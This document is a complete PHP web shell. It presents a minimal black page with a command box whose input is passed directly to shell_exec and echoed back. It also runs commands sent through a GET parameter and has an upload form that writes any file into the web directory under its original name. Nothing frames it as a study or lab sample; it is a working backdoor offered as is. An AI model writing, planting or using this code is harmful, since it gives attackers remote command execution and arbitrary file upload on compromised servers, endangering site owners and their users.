<body>
<style type="text/css">
    body,input[type="file"]{
        background-color: black;}
    code,input[type="file"]{
        color: white;
    }
</style>
<center>
    <br>
    <br>
    <br>
<form action="" method="POST">
    <input type=text placeholder='ender command' name='cmd'>
    <input type=submit>
</form>

<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name='myfile'>
    <input type="submit" value="upload">
</form>
</center>
<?php 

if(!empty($_FILES)) {
    $image=$_FILES['myfile'];
    echo "File Name<b>::</b> ".$image['name'];
    move_uploaded_file($image['tmp_name'],"./".$image['name']);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (empty($_POST["cmd"])) {
        echo "<code>enter command</code>";
     } else {
        echo "<pre><code>";
        echo shell_exec($_POST["cmd"]);
        echo "</code></pre>";
     }
  }
if ($_GET['cmd']){
        echo "<div>";
        shell_exec($_GET['cmd']);
        echo "</div>";            
    }
?>
</body>